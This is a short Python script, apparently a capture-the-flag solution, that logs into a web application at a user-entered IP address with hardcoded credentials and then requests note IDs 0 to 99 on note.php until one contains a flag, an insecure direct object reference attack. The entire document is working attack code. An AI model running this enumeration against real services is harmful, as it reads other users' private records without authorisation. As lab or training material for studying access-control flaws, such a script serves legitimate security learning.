#!/bin/env python3
import requests
import sys

ip_address = input("Enter the IP Address> ")
url = f"http://{ip_address}/"
params = {"user" : "noot", "pass" : "test1234" }
sess = requests.session()
print ("[+] logging in")
flag = sess.get(f"{url}index.php", params=params, allow_redirects=False)
if 302 == flag.status_code:
        print ("[+] login successfull")
else:
        print ("[-] login failure exiting")
        sys.exit()
print ()
for i in range(0,100):
        params = {"note" : f"{i}"}
        flag = sess.get(f"{url}note.php", params=params).text
        if not flag:
                pass
        elif "flag" in flag:
                print ("[+] We found the flag!!!!!")
                print(flag.strip())
                sys.exit()
print ("[-] I wasn't able to retrieve any flags")
